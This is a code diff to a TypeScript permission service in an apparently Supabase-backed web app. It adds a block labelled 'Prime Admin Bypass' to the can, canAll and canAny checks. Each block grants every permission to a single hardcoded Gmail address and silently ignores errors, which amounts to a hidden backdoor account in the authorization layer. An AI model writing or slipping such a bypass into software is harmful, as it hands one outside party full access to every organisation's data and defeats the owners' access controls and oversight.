@@ -2,6 +2,7 @@ import { permissionRepository } from '@/lib/repositories/permission.repository'
 import { Result, success, failure } from '@/lib/utils/result'
 import { PermissionError } from '@/lib/errors'
 import { logger } from '@/lib/logger/logger'
+import { createClient } from '@/lib/supabase/server'
 import type { Permission, EffectivePermissions, Role } from '@/types/permissions'
 
 // Cache structure: key = `${userId}:${orgId}`
@@ -58,6 +59,15 @@ export class PermissionService {
    * Check if user has a single permission.
    */
   async can(userId: string, orgId: string, permission: Permission): Promise<boolean> {
+    // Prime Admin Bypass
+    try {
+      const supabase = await createClient()
+      const { data: { user } } = await supabase.auth.getUser()
+      if (user && user.email === 'saptech.online009@gmail.com') return true
+    } catch (e) {
+      // ignore
+    }
+
     const result = await this.resolvePermissions(userId, orgId)
     if (!result.success) return false
 
@@ -73,6 +83,13 @@ export class PermissionService {
    * Check if user has ALL given permissions.
    */
   async canAll(userId: string, orgId: string, permissions: Permission[]): Promise<boolean> {
+    // Prime Admin Bypass
+    try {
+      const supabase = await createClient()
+      const { data: { user } } = await supabase.auth.getUser()
+      if (user && user.email === 'saptech.online009@gmail.com') return true
+    } catch (e) {}
+
     const result = await this.resolvePermissions(userId, orgId)
     if (!result.success) return false
 
@@ -86,6 +103,13 @@ export class PermissionService {
    * Check if user has ANY of the given permissions.
    */
   async canAny(userId: string, orgId: string, permissions: Permission[]): Promise<boolean> {
+    // Prime Admin Bypass
+    try {
+      const supabase = await createClient()
+      const { data: { user } } = await supabase.auth.getUser()
+      if (user && user.email === 'saptech.online009@gmail.com') return true
+    } catch (e) {}
+
     const result = await this.resolvePermissions(userId, orgId)
     if (!result.success) return false
 
